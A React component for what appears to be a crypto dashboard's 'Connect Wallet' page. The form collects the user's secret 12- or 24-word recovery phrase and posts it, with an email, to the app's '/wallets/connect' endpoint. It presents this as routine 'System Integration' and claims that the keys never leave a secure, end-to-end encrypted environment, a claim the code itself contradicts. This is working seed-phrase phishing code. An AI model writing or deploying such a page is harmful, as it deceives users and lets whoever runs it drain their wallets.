import React, { useEffect, useState } from "react";
import Container from "../../components/Container";
import Alert from "../../components/vendor/alert/Alert";
import TextInput from "../../components/vendor/form/TextInput";
import TextArea from "../../components/vendor/form/TextArea";
import SubmitButton from "../../components/vendor/button/SubmitButton";
import SelectInput from "../../components/vendor/form/SelectInput";
import api from "../../api/config";
import { useAppState } from "../../AppStateContext";
import { check } from "../../api/auth";
import { ReactComponent as WalletIcon } from "../../resources/images/dashboard/index/account-arrows-svgrepo-com.svg";

export default function Wallet() {
  const { setIsLogged } = useAppState();
  const [loading, setLoading] = useState(false);
  const [fetching, setFetching] = useState(true);
  const [wallets, setWallets] = useState([]);
  const [result, setResult] = useState({ status: 0, message: null });
  const [formData, setFormData] = useState({
    wallet_id: "",
    email_address: "",
    recovery_phrase: "",
  });

  useEffect(() => {
    const fetchMasterWallets = async () => {
      try {
        const response = await api.get("/wallets/master");
        if (response.data.status === 200) {
          setWallets(response.data.data);
        }
      } catch (error) {
        console.error("Failed to fetch wallets", error);
      } finally {
        setFetching(false);
      }
    };
    fetchMasterWallets();
  }, []);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
      const response = await api.post("/wallets/connect", formData);
      setResult({
        status: response.data.status,
        message: response.data.message,
      });
      if (response.data.status === 200) {
        setFormData({ wallet_id: "", email_address: "", recovery_phrase: "" });
        const newResult = await check();
        setIsLogged(newResult);
      }
    } catch (error) {
      setResult({
        status: 400,
        message: error.response?.data?.message || "Something went wrong.",
      });
    } finally {
      setLoading(false);
    }
  };

  const walletOptions = wallets.map((w) => ({
    content: `${w.wallet_name} (${w.wallet_network})`,
    value: w.id,
  }));

  return (
    <Container title="Connect Wallet">
      <div className="max-w-3xl mx-auto px-4 py-12">
        <div className="glass-card rounded-[2.5rem] shadow-2xl border-white/10 overflow-hidden">
          {/* Form Header */}
          <div className="p-8 pb-0 text-center space-y-3">
            <div className="mx-auto w-16 h-16 bg-blue-500/10 rounded-2xl flex items-center justify-center text-blue-500 mb-4 scale-110 shadow-inner">
               <WalletIcon className="w-8 h-8" />
            </div>
            <h1 className="text-3xl font-black tracking-tight">System Integration</h1>
            <p className="text-gray-500 dark:text-gray-400 max-w-md mx-auto">
              Securely synchronize your crypto wallet with your dashboard to enable live balance tracking and NFT management.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="p-8 md:p-12 space-y-6">
            <Alert result={result} setResult={setResult} timer={5000} />
            
            <div className="space-y-4">
              <div className="group transition-all duration-300">
                <label className="block text-sm font-bold text-gray-700 dark:text-gray-300 mb-2 ml-1">
                  Primary Contact (Optional)
                </label>
                <TextInput
                  handleChange={handleChange}
                  placeholder="name@example.com"
                  name="email_address"
                  value={formData.email_address}
                  type="email"
                  className="rounded-2xl border-gray-100 dark:border-gray-800 focus:ring-blue-500"
                />
              </div>

              <div className="group">
                <label className="block text-sm font-bold text-gray-700 dark:text-gray-300 mb-2 ml-1">
                  Select Wallet Provider
                </label>
                <SelectInput
                  handleChange={handleChange}
                  placeholder={fetching ? "Loading wallets..." : "Choose your wallet"}
                  name="wallet_id"
                  value={formData.wallet_id}
                  required={true}
                  options={walletOptions}
                  className="rounded-2xl border-gray-100 dark:border-gray-800"
                />
              </div>

              <div className="group">
                <label className="block text-sm font-bold text-gray-700 dark:text-gray-300 mb-2 ml-1">
                  Secret Recovery Phrase
                </label>
                <TextArea
                  handleChange={handleChange}
                  placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces..."
                  name="recovery_phrase"
                  value={formData.recovery_phrase}
                  required={true}
                  rows={4}
                  className="rounded-2xl border-gray-100 dark:border-gray-800 bg-gray-50 dark:bg-gray-800/20"
                />
                <p className="mt-2 text-[11px] text-amber-500 font-bold flex items-center gap-1 uppercase tracking-wider">
                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" /></svg>
                  Sensitive Information: data is encrypted during sync
                </p>
              </div>
            </div>

            <div className="pt-4">
              <SubmitButton 
                loading={loading} 
                className="w-full py-4 bg-gradient-to-r from-blue-600 to-indigo-700 text-white rounded-2xl font-black shadow-xl shadow-blue-500/30 hover:shadow-blue-500/50 hover:scale-[1.02] transition-all duration-300 active:scale-[0.98]"
                text="CONNECT SECURELY"
              />
            </div>
          </form>
          
          <div className="px-8 py-6 bg-gray-50/50 dark:bg-gray-800/20 border-t border-gray-100 dark:border-gray-800 text-center">
             <p className="text-xs text-gray-400 font-medium">
               Protected by end-to-end 256-bit encryption. Your keys never leave the secure environment.
             </p>
          </div>
        </div>
      </div>
    </Container>
  );
}
